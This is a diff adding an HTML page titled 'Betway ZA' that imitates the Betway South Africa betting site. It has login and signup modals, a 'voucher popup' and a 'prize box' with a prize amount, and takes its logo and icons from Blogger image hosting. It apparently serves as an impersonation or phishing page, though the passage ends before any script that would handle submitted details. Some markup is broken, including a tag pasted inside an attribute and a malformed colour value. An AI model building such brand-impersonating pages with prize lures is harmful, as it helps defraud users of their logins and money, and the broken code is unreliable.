@@ -1,0 +1,1811 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Betway ZA</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <style>
+    /* Reset & Base */
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html,body { height: 100%; }
+    body {
+      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+      background: #111;
+      color: #fff;
+      -webkit-font-smoothing:antialiased;
+      padding-bottom: 86px; /* space for bottom nav */
+      line-height: 1.4;
+    }
+
+    a { color: inherit; text-decoration: none; }
+
+    /* Header (fixed) */
+    .top-bar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 60px;
+      background: #000;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 14px;
+      z-index: 1200;
+      box-shadow: 0 1px 0 rgba(255,255,255,0.02) inset;
+    }
+    .top-left 
+    { 
+    display:flex; 
+    align-items:center; 
+    gap:12px; }
+    .menu-icon 
+    { font-size: 22px; cursor: pointer; color:#fff; }
+    .brand { font-weight:700; font-size:24px; color:#fff; letter-spacing: -1px; }
+    .auth-buttons {
+  display: flex;
+  gap: 10px;
+  align-items: center;
+  transform: translateY(8px); /* visually aligns perfectly */
+}
+    .btn { border: none; padding:8px 14px; border-radius:6px; font-weight:700; cursor:pointer; font-size:14px; }
+    .btn-login { background:#fff; color:#0b8a00; }
+    .btn-signup { background:#0b8a00; color:#fff; }
+
+    /* Page container */
+    .page {
+      padding: 78px 14px 20px; /* top for fixed header */
+      max-width: 980px;
+      margin: 0 auto;
+    }
+
+    /* Search box */
+    .search-box {
+      background:#1e1e1e;
+      border-radius:7px;
+      padding:8px;
+      display:flex;
+      align-items:center;
+      gap:10px;
+      border:1px solid rgba(255,255,255,0.17);
+    }
+    .search-box input {
+      background:transparent;
+      border:none;
+      color:#ccc;
+      font-size:16px;
+      outline:none;
+      width:100%;
+    }
+    .search-box i { color:#aaa; }
+
+    /* Booking row */
+    .booking-row {
+      display:flex;
+      gap:5px;
+      margin-top:14px;
+      align-items:center;
+    }
+    .booking-left {
+      flex:1;
+      display:flex;
+      gap:10px;
+      align-items:center;
+      background:#242424;
+      border-radius:7px;
+      padding:2px;
+      border:1px solid rgba(255,255,255,0.17);
+    }
+    .booking-left input {
+      background:transparent; border:none; color:#ddd; outline:none; font-size:15px; width:100%;
+    }
+    .booking-left .btn-go {
+      background:#0b8a00; color:#fff; border-radius:8px; padding:8px 5px; border:none; cursor:pointer;
+      display:flex; align-items:center; justify-content:center;
+    }
+    .booking-right {
+      width:140px;
+      text-align:center;
+      background:#2b2b2b;
+      padding:9px;
+      border-radius:7px;
+      border:1px solid rgba(255,255,255,0.17);
+      color:#ddd;
+      font-size:15px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      gap:8px;
+    }
+
+    /* Cards (Sport + Casino) */
+    .cards {
+      display: flex;
+      justify-content: center;
+      align-items: stretch;
+      gap: 12px;
+      margin-top: 20px;
+    }
+    .card {
+      flex: 1;
+      border-radius: 16px;
+      padding: 28px 10px 24px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      color: #fff;
+      transition: transform 0.25s ease, box-shadow 0.25s ease;
+      min-height: 180px;
+    }
+    .card img {
+      width: 74px;
+      height: 74px;
+      object-fit: contain;
+      margin-bottom: 16px;
+    }
+    .card .label {
+      font-weight: 800;
+      font-size: 26px;
+      letter-spacing: 0.5px;
+      text-shadow: 0 1px 2px rgba(0,0,0,0.4);
+    }
+    .card:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 20px rgba(0,0,0,0.35);
+    }
+    .sport-card {
+      background: linear-gradient(180deg, #000000 0%, #00c851 100%);
+    }
+    .casino-card {
+      background: linear-gradient(180deg, #000000 0%, #007bff 100%);
+    }
+    @media (min-width: 421px) {
+      .sport-card,
+      .casino-card {
+        flex: 1;
+      }
+    }
+    @media (max-width: 420px) {
+      .card img { width: 64px; height: 64px; }
+      .card .label { font-size: 22px; }
+    }
+
+    /* Welcome banner */
+    .welcome {
+      margin-top:28px;
+      padding:22px;
+      background:#0f0f0f;
+      border-radius:12px;
+      border:1px solid rgba(255,255,255,0.02);
+    }
+    .welcome h1 {
+      font-size:22px; margin-bottom:10px; color:#fff;
+    }
+    .welcome p { color:#bfc7cc; font-size:15px; line-height:1.6; }
+
+    /* Promotions */
+    .promos {
+      margin-top:22px;
+      display:flex;
+      gap:12px;
+      overflow:auto;
+    }
+    .promo-card {
+      min-width:220px;
+      background:linear-gradient(135deg,#121212,#1b1b1b);
+      padding:18px;
+      border-radius:12px;
+      border:1px solid rgba(255,255,255,0.03);
+    }
+    .promo-card h4 { font-size:16px; margin-bottom:8px; }
+    .promo-card p { color:#bfc7cc; font-size:13px; }
+
+    /* App download */
+    .app-download {
+      margin-top:22px;
+      display:flex;
+      gap:12px;
+      align-items:center;
+      justify-content:flex-start;
+    }
+    .app-btn {
+      display:inline-flex;
+      align-items:center;
+      gap:10px;
+      background:#222;
+      padding:10px 14px;
+      border-radius:10px;
+      border:1px solid rgba(255,255,255,0.03);
+      color:#fff;
+      font-weight:700;
+      min-width:120px;
+      justify-content:center;
+    }
+    .app-btn svg { width:22px; height:22px; }
+
+    /* Support & partners */
+    .support {
+      margin-top:26px;
+      display:flex;
+      gap:18px;
+      flex-wrap:wrap;
+    }
+    .support .box { background:#0f0f0f; padding:14px; border-radius:10px; border:1px solid rgba(255,255,255,0.03); flex:1; min-width:200px; }
+    .partners { margin-top:12px; display:flex; gap:10px; align-items:center; flex-wrap:wrap; }
+
+    /* Footer */
+    footer.site-footer {
+      margin-top:30px;
+      background:#0b0b0b;
+      color:#ddd;
+      padding:28px 14px 120px; /* bottom padding to clear bottom nav */
+      border-top: 1px solid rgba(255,255,255,0.02);
+    }
+    .footer-grid {
+      display:grid;
+      grid-template-columns: repeat(2,1fr);
+      gap:18px;
+      max-width:980px;
+      margin:0 auto;
+    }
+    .footer-grid a { display:block; padding:6px 0; color:#ddd; font-weight:600; }
+    .footer-bottom {
+      margin-top:18px;
+      color:#9aa4a8;
+      font-size:13px;
+    }
+
+    /* Bottom nav (fixed) */
+    .bottom-nav {
+      position: fixed;
+      left:0; right:0; bottom:0;
+      height:72px;
+      background:#000;
+      display:flex;
+      justify-content:space-around;
+      align-items:center;
+      z-index:1300;
+      border-top:1px solid rgba(255,255,255,0.02);
+    }
+    .bottom-nav .item { color:#ccc; text-align:center; font-size:12px; display:flex; flex-direction:column; align-items:center; gap:6px; }
+    .bottom-nav .item.active { color:#0b8a00; }
+    .bottom-nav svg { width:22px; height:22px; }
+
+    .login-container {
+      width: 100%;
+      max-width: 420px;
+      background: #fff;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 10px 35px rgba(0, 0, 0, 0.4);
+      transform: translateY(-20px);
+      transition: transform 0.3s ease, opacity 0.3s ease;
+      opacity: 0;
+    }
+    .overlay.active .login-container { transform: translateY(0); opacity: 1; }
+
+    .login-header {
+      background: #111;
+      color: #fff;
+      padding: 16px 20px;
+      font-size: 20px;
+      font-weight: 700;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .close-btn {
+      background: none;
+      border: none;
+      color: #fff;
+      font-size: 26px;
+      cursor: pointer;
+    }
+
+    .login-body { padding: 22px; color: #000; }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 14px;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 12px 14px 12px 60px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+      background: #f6f6f6;
+      font-size: 15px;
+    }
+    .prefix {
+      position: absolute;
+      left: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-weight: 600;
+      color: #333;
+    }
+
+    .password-wrapper { position: relative; margin-bottom: 10px; }
+    .password-wrapper input {
+      width: 100%;
+      padding: 12px 14px;
+      padding-right: 44px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+      background: #f6f6f6;
+    }
+    .eye-btn {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: transparent;
+      border: none;
+      cursor: pointer;
+    }
+    .forgot { text-align: right; margin-bottom: 14px; }
+    .signup-box {
+      background: #f0f0f0;
+      padding: 7px;
+      border-radius: 4px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+    .login-action {
+      width: 100%;
+      padding: 13px;
+      background: #0b8a00;
+      border: none;
+      color: #fff;
+      font-weight: 700;
+      border-radius: 4px;
+      font-size: 17px;
+      cursor: pointer;
+    }
+    .login-action:hover { background: #099500; }
+
+    /* --- White Betway Menu with SVG icons --- */
+    .mobile-menu.white {
+      position: fixed;
+      top: 0; left: 0;
+      height: 100%;
+      width: 80%;
+      max-width: 360px;
+      background: #fff;
+      color: #111;
+      z-index: 2500;
+      transform: translateX(-100%);
+      transition: transform 0.35s ease;
+      overflow-y: auto;
+      padding: 20px;
+      box-shadow: 2px 0 10px rgba(0,0,0,0.1);
+    }
+    .mobile-menu.white.active { transform: translateX(0); }
+
+    .menu-header {
+      display: flex; justify-content: space-between; align-items: center;
+      margin-bottom: 15px;
+    }
+    .menu-close {
+      background: none;
+      border: none;
+      font-size: 26px;
+      cursor: pointer;
+      color: #555;
+    }
+
+    .auth-buttons {
+      display: flex;
+      justify-content: space-between;
+      gap: 8px;
+      margin-bottom: 20px;
+    }
+    .login-btn {
+      flex: 1;
+      border: 1px solid #0b8a00;
+      color: #0b8a00;
+      background: transparent;
+      font-weight: 700;
+      border-radius: 6px;
+      padding: 10px 0;
+    }
+    .signup-btn {
+      flex: 1;
+      background: #0b8a00;
+      color: #fff;
+      border: none;
+      font-weight: 700;
+      border-radius: 6px;
+      padding: 10px 0;
+    }
+
+    .menu-section { margin-bottom: 25px; }
+    .menu-section h3 {
+      font-weight: 700;
+      font-size: 15px;
+      margin-bottom: 10px;
+    }
+    .menu-section ul {
+      list-style: none;
+      border-top: 1px solid #eee;
+      padding: 0;
+      margin: 0;
+    }
+    .menu-section li {
+      border-bottom: 1px solid #eee;
+    }
+    .menu-section a {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: #333;
+      text-decoration: none;
+      padding: 10px 0;
+      font-weight: 500;
+      font-size: 14px;
+    }
+    .menu-section a:hover {
+      color: #0b8a00;
+    }
+    .menu-section a svg {
+      flex-shrink: 0;
+      transition: fill 0.2s;
+    }
+    .menu-section a:hover svg {
+      fill: #0b8a00;
+    }
+
+    .menu-section select {
+      width: 100%;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      padding: 8px;
+      margin-bottom: 10px;
+      background: #fff;
+      color: #333;
+    }
+
+    .app-buttons {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-top: 10px;
+    }
+    .app-btn {
+      text-align: center;
+      padding: 10px;
+      border-radius: 6px;
+      font-weight: 700;
+      font-size: 14px;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .app-btn.apple,
+    .app-btn.google { background: #000; }
+
+    .collapsible h3 {
+      cursor: pointer;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    /* -------- VOUCHER POPUP (UPDATED STYLE) -------- */
+    .voucher-popup {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: rgba(0,0,0,0.8);
+      z-index: 2600;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.35s ease;
+    }
+
+    .voucher-popup.active {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .voucher-card {
+      background: #fff;
+      color: #000;
+      border-radius: 14px;
+      width: 92%;
+      max-width: 400px;
+      text-align: center;
+      padding: 28px 20px 26px;
+      box-shadow: 0 0 25px rgba(11,138,0,0.25), 0 6px 25px rgba(0,0,0,0.45);
+      transform: translateY(-16px);
+      opacity: 0;
+      transition: transform 0.36s ease, opacity 0.36s ease;
+    }
+
+    .voucher-popup.active .voucher-card {
+      transform: translateY(0);
+      opacity: 1;
+    }
+
+    .voucher-card h2 {
+      color: #ff4055#00b511;
+      font-size: 22px;
+      margin-bottom: 10px;
+      font-weight: 800;
+    }
+
+    .voucher-card .subtitle {
+      font-size: 15px;
+      color: #333;
+      margin-bottom: 14px;
+      font-weight: 600;
+    }
+
+    .voucher-card .small {
+      font-size: 13px;
+      color: #444;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+
+    .voucher-amount {
+      display: inline-block;
+      background: linear-gradient(90deg,#0b8a00,#00c851);
+      color: #fff;
+      padding: 10px 18px;
+      border-radius: 10px;
+      font-weight: 800;
+      font-size: 24px;
+      margin-bottom: 18px;
+      letter-spacing: 0.5px;
+      text-shadow: 0 0 6px rgba(0,0,0,0.3);
+    }
+
+    .voucher-btn {
+      display: block;
+      width: 100%;
+      padding: 14px 14px;
+      background: #0b8a00;
+      color: #fff;
+      font-weight: 800;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: background 0.25s ease, transform 0.2s ease;
+    }
+
+    .voucher-btn:hover {
+      background: #0da000;
+      transform: scale(1.02);
+    }
+
+    /* ---- Prize Box ---- */
+    .prize-box {
+      margin: 20px auto;
+      text-align: center;
+      background: linear-gradient(135deg, rgba(0, 255, 0, 0.15), rgba(255, 255, 255, 0.03));
+      border: 1px solid rgba(0,255,0,0.25);
+      border-radius: 12px;
+      padding: 16px 22px;
+      width: fit-content;
+      box-shadow: 0 0 18px rgba(0,255,0,0.15);
+    }
+
+    .prize-label {
+      display: block;
+      font-size: 14px;
+      color: #ccc;
+      font-weight: 500;
+    }
+
+    .prize-amount {
+      display: inline-block;
+      font-size: 26px;
+      font-weight: 800;
+      color: #00ff5e;
+      margin-top: 4px;
+      letter-spacing: 1px;
+      text-shadow: 0 0 10px rgba(0,255,0,0.3);
+    }
+
+    /* ---- Small screens ---- */
+    @media (max-width:420px) {
+      .card img { width:64px; height:64px; }
+      .card .label { font-size:24px; }
+      .promo-card { min-width:180px; }
+      .footer-grid { grid-template-columns: 1fr; }
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); box-shadow: 0 0 10px rgba(0,255,0,0.2); }
+      50% { transform: scale(1.05); box-shadow: 0 0 20px rgba(0,255,0,0.4); }
+      100% { transform: scale(1); box-shadow: 0 0 10px rgba(0,255,0,0.2); }
+    }
+
+    /* SVG icon styling for menu (realistic stroke icons) */
+    .menu-section a svg { display:block; width:18px; height:18px; flex-shrink:0; }
+    .menu-section a svg [stroke] { stroke: #6b7280; }
+    .menu-section a svg [fill="none"] { fill: none; }
+    .menu-section a svg [fill="#6b7280"] { /* filled dots/bars keep same tone */ }
+    .menu-section a:hover svg [stroke] { stroke: #0b8a00; }
+    .menu-section a:hover svg [fill="#6b8a00"] { fill: #0b8a00; }
+
+    .overlay {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: rgba(0,0,0,0.7);
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+      z-index: 3000;
+    }
+
+    .overlay.active {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .overlay.active .login-container {
+      transform: translateY(0);
+      opacity: 1;
+      transition: transform 0.3s ease, opacity 0.3s ease;
+    }
+
+    /* ---------- SIGNUP MODAL specific styles ---------- */
+    .signup-container {
+      width: 100%;
+      max-width: 520px;
+      background: #fff;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 14px 40px rgba(0,0,0,0.45);
+      transform: translateY(-20px);
+      transition: transform 0.32s ease, opacity 0.32s ease;
+      opacity: 0;
+      max-height: 92vh;
+      display: flex;
+      flex-direction: column;
+    }
+    .overlay.active .signup-container { transform: translateY(0); opacity: 1; }
+
+    .signup-header {
+      background: #111;
+      color: #fff;
+      padding: 16px 20px;
+      font-size: 20px;
+      font-weight: 700;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .signup-body {
+      padding: 22px;
+      color: #000;
+      overflow:auto;
+    }
+
+    /* Loader (Betway-style ball loading bar) */
+    .loader-wrap { display:flex; justify-content:center; align-items:center; padding:22px 10px; }
+    .ball-loader {
+      display:flex;
+      gap:8px;
+      align-items:center;
+      justify-content:center;
+    }
+    .ball {
+      width:14px;
+      height:14px;
+      background: linear-gradient(180deg,#0b8a00,#00c851);
+      border-radius:50%;
+      box-shadow: 0 2px 8px rgba(11,138,0,0.24);
+      transform-origin: center;
+      animation: ballBounce 1s infinite ease-in-out;
+    }
+    .ball:nth-child(2) { animation-delay: 0.12s; width:10px; height:10px; }
+    .ball:nth-child(3) { animation-delay: 0.24s; width:8px; height:8px; opacity:0.85; }
+    @keyframes ballBounce {
+      0% { transform: translateY(0) scale(1); opacity:1; }
+      50% { transform: translateY(-10px) scale(1.05); opacity:0.9; }
+      100% { transform: translateY(0) scale(1); opacity:1; }
+    }
+
+    /* Signup form fields */
+    .signup-grid {
+      display:grid;
+      grid-template-columns: repeat(2,1fr);
+      gap:10px;
+    }
+    @media (max-width:520px) {
+      .signup-grid { grid-template-columns: 1fr; }
+    }
+
+    .form-row { margin-bottom:12px; }
+    .form-row input, .form-row select {
+      width:100%;
+      padding:12px 14px;
+      border-radius:6px;
+      border:1px solid #ddd;
+      background:#f6f6f6;
+      font-size:15px;
+    }
+    .form-row label { display:block; margin-bottom:6px; font-weight:700; color:#222; font-size:13px; }
+    .error { color: #c33; font-size: 13px; margin-top:6px; display:none; }
+
+    /* Terms and buttons */
+    .terms { display:flex; gap:8px; align-items:flex-start; margin:10px 0 12px; color:#333; }
+    .create-account {
+      width:100%;
+      padding:15px;
+      background:#0b8a00;
+      color:#fff;
+      font-weight:800;
+      border:none;
+      border-radius:8px;
+      cursor:pointer;
+      font-size:16px;
+    }
+    .create-account:disabled { opacity:0.6; cursor:not-allowed; }
+    .small-note { color:#666; font-size:13px; margin-top:8px; }
+
+    /* Already have account link */
+    .alt-action { text-align:center; margin-top:12px; color:#333; font-weight:600; }
+    .alt-action a { color:#0b8a00; font-weight:800; margin-left:6px; }
+
+    /* subtle form footer spacing */
+    .form-footer { margin-top:8px; font-size:13px; color:#666; }
+
+    /* loader message style inside modal */
+    .loader-message {
+      text-align:center;
+      font-weight:799;
+      color:#111;
+      margin-bottom:13px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Mobile Menu (White with realistic stroke SVG icons) -->
+  <nav class="mobile-menu white" id="mobileMenu" aria-hidden="true">
+    <div class="menu-header">
+      <div class="site-name"></div>
+      <button class="menu-close" aria-label="Close menu">×</button>
+    </div>
+
+    <div class="auth-buttons">
+      <button class="login-btn" onclick="openLogin()">Login</button>
+      <button class="signup-btn" onclick="openSignup()">Sign Up</button>
+    </div>
+
+    <div class="menu-section">
+      <h3>Quick Links</h3>
+      <ul>     
+     
+      
+        <!-- Insider Blog -->
+        <li>
+          <a href="#">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
+              <rect x="3" y="4" width="14" height="16" rx="2" stroke="#6b7280" stroke-width="1.6" stroke-linejoin="round"/>
+              <path d="M7 8h7" stroke="#6b7280" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+              <path d="M7 12h7" stroke="#6b7280" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+              <path d="M7 16h4" stroke="#6b7280" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            Insider Blog
+          </a>
+        </li>
+
+        <!-- Promotions (ticket) -->
+        <li>
+          <a href="#">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
+              <path d="M3 8.5A2.5 2.5 0 0 1 5.5 6h13A2.5 2.5 0 0 1 21 8.5v7A2.5 2.5 0 0 1 18.5 18h-13A2.5 2.5 0 0 1 3 15.5v-7z" stroke="#6b7280" stroke-width="1.6" stroke-linejoin="round"/>
+              <circle cx="8.5" cy="12" r="0.9" fill="#6b7280"/>
+              <circle cx="15.5" cy="12" r="0.9" fill="#6b7280"/>
+            </svg>
+            Promotions
+          </a>
+        </li>
+
+        <!-- Betway App (phone) -->
+        <li>
+          <a href="#">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
+              <rect x="7" y="2" width="10" height="20" rx="2" stroke="#6b7280" stroke-width="1.6" stroke-linejoin="round"/>
+              <circle cx="12" cy="18" r="0.8" fill="#6b7280"/>
+            </svg>
+            Betway App
+          </a>
+        </li>
+
+        <!-- Contact Us (chat bubble) -->
+        <li>
+          <a href="#">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
+              <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v10z" stroke="#6b7280" stroke-width="1.6" stroke-linejoin="round"/>
+              <path d="M8 11h8" stroke="#6b7280" stroke-width="1.6" stroke-linecap="round"/>
+              <path d="M8 14h5" stroke="#6b7280" stroke-width="1.6" stroke-linecap="round"/>
+            </svg>
+            Contact Us
+          </a>
+        </li>
+
+        <!-- Live Scores (clock / live) -->
+        <li>
+          <a href="#">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
+              <circle cx="12" cy="12" r="8" stroke="#6b7280" stroke-width="1.6"/>
+              <path d="M12 8v5l3 1" stroke="#6b7280" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+              <path d="M18 6v3" stroke="#6b7280" stroke-width="1.6" stroke-linecap="round"/>
+            </svg>
+            Live Scores
+          </a>
+        </li>
+
+        <!-- Betting Rules & Tips (book) -->
+        <li>
+          <a href="#">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
+              <path d="M6 4h10v14a2 2 0 0 1-2 2H6V4z" stroke="#6b7280" stroke-width="1.6" stroke-linejoin="round"/>
+              <path d="M8 4v16" stroke="#6b7280" stroke-width="1.6" stroke-linecap="round"/>
+              <path d="M9 8h6" stroke="#6b7280" stroke-width="1.6" stroke-linecap="round"/>
+            </svg>
+            Betting Rules & Tips
+          </a>
+        </li>
+
+        <!-- Statistics (chart) -->
+        <li>
+          <a href="#">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
+              <path d="M3 3v18h18" stroke="#6b7280" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+              <rect x="6" y="12" width="2.5" height="6" rx="0.5" fill="#6b7280"/>
+              <rect x="11" y="8" width="2.5" height="10" rx="0.5" fill="#6b7280"/>
+              <rect x="16" y="5" width="2.5" height="13" rx="0.5" fill="#6b7280"/>
+            </svg>
+            Statistics
+          </a>
+        </li>
+      </ul>
+    </div>
+
+    <div class="menu-section collapsible">
+      <h3 onclick="toggleCustomerHub()">Customer Hub <span id="hubArrow">▼</span></h3>
+      <div id="hubContent" style="display:none;">
+        <label>Theme</label>
+        <select>
+          <option>Light</option>
+          <option>Dark</option>
+        </select>
+
+        <label>Odds format</label>
+        <select>
+          <option>Decimal</option>
+          <option>Fractional</option>
+        </select>
+
+        <div class="app-buttons">
+          <a href="#" class="app-btn apple">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true" xmlns="http://www.w3.org/2000/svg"><path d="M16.365 1.43c-.94.05-2.074.63-2.749 1.36-.6.65-1.15 1.72-1.01 2.75 1.08.04 2.2-.63 2.84-1.34.62-.68 1.02-1.78.92-2.77z" stroke="#fff" stroke-width="0.9" stroke-linecap="round" stroke-linejoin="round"/><path d="M12 5c-1.6 0-3 1-3.6 2.5C8 9.5 8.6 12 10 13.7c.7.9 1.5 1.7 2.5 1.7 1 0 1.4-.6 2.6-.6 1.2 0 1.5.6 2.6.6 1 0 1.8-.8 2.5-1.7 1.4-1.8 2-4.3 1.1-6.2C18 6 16.5 5 15 5c-1.5 0-2.1.7-3.2.7C12.7 5.7 12.4 5 12 5z" stroke="#fff" stroke-width="0.9" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            Download on Apple Store
+          </a>
+          <a href="#" class="app-btn google">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true" xmlns="http://www.w3.org/2000/svg"><path d="M3 2l9 6-9 6z" stroke="#fff" stroke-width="0.9" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            Download for Android
+          </a>
+        </div>
+      </div>
+    </div>
+  </nav>
+
+  <!-- Top bar -->
+  <div class="top-bar" role="banner">
+    <div class="top-left">
+      <div class="menu-icon" aria-hidden="  <div class="menu-icon" aria-hidden="true">☰</div>
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEih_9Gh-WcbcueDJuQQSARoLB5clVrnNZ-cn-58qHNo4NFvKtx_-n06r-7rVOtpJpt4Qfd7bNBoSIXjbRso4A4U0x7Rh4lrl5sOp14JE9kXLEjlgEfWZxNTBrZSua1DKTQyQ8NV3VRlLufckjT4NvFSeCmw52lEfrOm8U3n7aAhBqTdKSswva64WQdKH7Xw/s447/1000088987.png"
+   style="display:block; padding:0.6em 0; text-align:center;">
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEih_9Gh-WcbcueDJuQQSARoLB5clVrnNZ-cn-58qHNo4NFvKtx_-n06r-7rVOtpJpt4Qfd7bNBoSIXjbRso4A4U0x7Rh4lrl5sOp14JE9kXLEjlgEfWZxNTBrZSua1DKTQyQ8NV3VRlLufckjT4NvFSeCmw52lEfrOm8U3n7aAhBqTdKSswva64WQdKH7Xw/s447/1000088987.png"
+       alt="Betway Logo" width="120" style="display:block; margin:auto;">
+</a>
+
+
+
+    </div>
+
+    <div class="auth-buttons">
+      <button class="btn btn-login" onclick="openLogin()">Login</button>
+      <button class="btn btn-signup" onclick="openSignup()">Sign Up</button>
+    </div>
+  </div>
+
+  <!-- Page content -->
+  <main class="page" role="main">
+
+    <!-- Search -->
+    <div class="search-box" aria-label="Search">
+      <i data-lucide="search"></i>
+      <input type="search" placeholder="Search" aria-label="Search input">
+    </div>
+
+    <!-- Booking row -->
+    <div class="booking-row" style="margin-top:14px;">
+      <div class="booking-left" role="group" aria-label="Enter booking code">
+        <input type="text" placeholder="Enter Booking Code" aria-label="Booking code">
+        <button class="btn-go" aria-label="Go booking"> <i data-lucide="chevron-right" stroke-width="3"></i> </button>
+      </div>
+      <div class="booking-right" role="button" tabindex="0" aria-label="All codes">
+        All Codes <i data-lucide="chevron-right"></i>
+      </div>
+    </div>
+
+    <!-- Cards -->
+    <section class="cards" aria-label="Main sections">
+      <div class="card sport-card" role="button" tabindex="0" aria-label="Sport">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPG7fB8qX5LywFFnuKPD2F6p_gZxx1gTZXsEL4yZMkDxLSDaWblI_mxO-YO_aQpPELHxy_M5qXRCwajGeMel7JF4CtSrZJWrpFUJCURm8RYaggFR9pu25Nn9HEJOErdqomT_KEUNVWawBLRjDJ4R3idoY9L9Ptdih3KzQOcFvBNixKG9AIc0KJIgnL_jcp/s1600/1000083696.png" alt="Sport icon">
+        <div class="label">SPORT</div>
+      </div>
+
+      <div class="card casino-card" role="button" tabindex="0" aria-label="Casino">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiaskULmcbRsnl2JaqyWmnAQxGvbMKsZsbNloDJP1AEpCBJ368uOgSv53k9S37Ll467MCGFU7GtLvoHfcWpL1rH-DUZePleVmEfUl2bYCVt-_7m-RTysvDoPJxh7Ki7VicVZx66WHItuS0BNYfTnYgfL4ULv97zWAw6jPDvmKW07RmROJ-ZEJV9ZdjF2x4V/s1600/1000083712.png" alt="Casino icon">
+        <div class="label">CASINO</div>
+      </div>
+    </section>
+
+    <!-- Welcome banner (keeps wording similar to screenshot) -->
+    <section class="welcome" aria-label="Welcome">
+      <h1>Welcome to sports betting with Betway South Africa</h1>
+      <p>
+        <strong>Betway</strong> offers the very best in online sports betting. There is nothing that quite matches the excitement of watching your favorite teams go head-to-head with their biggest rivals in the most popular global sports.
+      </p>
+    </section>
+
+    <!-- Promotions -->
+    <section class="promos" aria-label="Promotions">
+      <div class="promo-card"><h4>Featured</h4><p>Top welcome offers and promotions available. T&Cs apply.</p></div>
+      <div class="promo-card"><h4>Live Betting</h4><p>Catch live odds and in-play markets for football, tennis and more.</p></div>
+      <div class="promo-card"><h4>Casino Boost</h4><p>Daily spins and bonuses in our casino section.</p></div>
+    </section>
+
+    <section class="app-download" aria-label="App downloads">
+      <div style="flex:1">
+        <h3 style="font-size:16px;margin-bottom:8px;">Download the Betway app</h3>
+        <div style="display:flex;gap:10px;flex-wrap:wrap">
+          <a class="app-btn" href="#" aria-label="Apple App Store">
